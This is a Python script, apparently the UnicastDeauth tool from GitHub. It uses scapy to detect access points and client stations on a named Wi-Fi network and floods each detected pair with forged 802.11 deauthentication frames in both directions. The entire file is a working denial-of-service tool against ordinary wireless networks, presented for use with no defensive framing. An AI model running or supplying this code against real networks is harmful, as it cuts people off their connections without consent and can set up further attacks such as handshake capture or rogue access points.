#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# add ap whitelist argument
# add module docstring
# add support for hidden networks

import sys
import argparse
from scapy import sendrecv
from scapy.layers import dot11

BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
BPF_DOT11_CONTROL =  'wlan type ctl'
BPF_DOT11_DATA = 'wlan type data'
DEAUTH_COUNT = 64
DEAUTH_INTER = 2./DEAUTH_COUNT

class MsgException(Exception):
    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.exception = exception
        self.message = message
    
    def __str__(self):
        return f'[!] Error! {self.message}:\n    {self.exception}'

def panic(msg_exception):
    '''exception handling'''
    
    print(msg_exception, file = sys.stderr)

def print_info(message):
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid):
    '''bssid type checking'''
    
    try:
        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException(e, 'BSSID could not be processed')
    return unicast

def get_src_dst_network(frame):
    '''frame control field parsing'''
    
    try:
        if frame.FCfield & 0x1:
            if not (frame.FCfield & 0x2):
                bssid_src = frame.addr2
                bssid_dst = frame.addr3
                bssid_network = frame.addr1
        else:
            bssid_dst = frame.addr1
            if frame.FCfield & 0x2:
                bssid_src = frame.addr3
                bssid_network = frame.addr2
            else:
                bssid_src = frame.addr2
                bssid_network = frame.addr3
    except Exception as e:
        raise MsgException(e, 'Frame Control field could not be processed')
    return bssid_src, bssid_dst, bssid_network

def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network):
    '''unicast deauthentication'''
    
    try:
        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
        sendrecv.sendp(
            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
            iface = wifi_interface,
            count = DEAUTH_COUNT,
            inter = DEAUTH_INTER,
            verbose = False,
        )
        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
        sendrecv.sendp(
            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
            iface = wifi_interface,
            count = DEAUTH_COUNT,
            inter = DEAUTH_INTER,
            verbose = False,
        )
    except Exception as e:
        raise MsgException(e, 'Deauthentication frames could not be sent')

def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dict):
    def sniffer_handler(frame):
        '''sniffed frame processing'''
        
        try:
            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
            if bssid_src and bssid_dst and bssid_network:
                
                if frame.haslayer(dot11.Dot11Beacon): # wlan type mgt subtype beacon
                    if not bssids_aps_dict.get(bssid_src):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                    bssids_aps_dict.update({bssid_src: bssid_network})
                                    print_info(f'AP detected for network {wifi_essid}'
                                        f'\n    network      = {bssid_network}'
                                        f'\n    access point = {bssid_src}')
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                else: # wlan type ctl or wlan type data
                    if bssids_aps_dict.get(bssid_src) and is_unicast(bssid_dst): # from ap to sta
                        if (not bssids_stas_dict.get(bssid_dst)) or (bssids_stas_dict.get(bssid_dst) != bssid_src):
                            bssids_stas_dict.update({bssid_dst: bssid_src})
                            print_info(f'STA detected for network {wifi_essid}'
                                f'\n    station      = {bssid_dst}'
                                f'\n    access point = {bssid_src}')
                            unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
                    elif bssids_aps_dict.get(bssid_dst): # from sta to ap
                        if (not bssids_stas_dict.get(bssid_src)) or (bssids_stas_dict.get(bssid_src) != bssid_dst):
                            bssids_stas_dict.update({bssid_src: bssid_dst})
                            print_info(f'STA detected for network {wifi_essid}'
                                f'\n    station      = {bssid_src}'
                                f'\n    access point = {bssid_dst}')
                            unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
        except Exception as e:
            raise MsgException(e, 'Sniffed frames could not be processed')
    return sniffer_handler

def main():
    '''main'''
    
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            help = 'Wi-Fi interface',
            required = True,
        )
        parser.add_argument(
            '-e',
            dest = 'wifi_essid',
            help = 'Wi-Fi ESSID',
            required = True,
        )
        args = parser.parse_args()
        bssids_aps_dict = {} # {ap bssid: network bssid}
        bssids_stas_dict = {} # {sta bssid: ap bssid}
        sendrecv.sniff(
            iface = args.wifi_interface,
            filter = BPF_DOT11_BEACON + ' or ' + BPF_DOT11_CONTROL + ' or ' + BPF_DOT11_DATA,
            prn = sniffer_wrapper(args.wifi_interface, args.wifi_essid, bssids_aps_dict, bssids_stas_dict),
        )
    except MsgException as msg_exception:
        panic(msg_exception)
    except Exception as e:
        panic(MsgException(e))

if __name__ == '__main__':
    main()
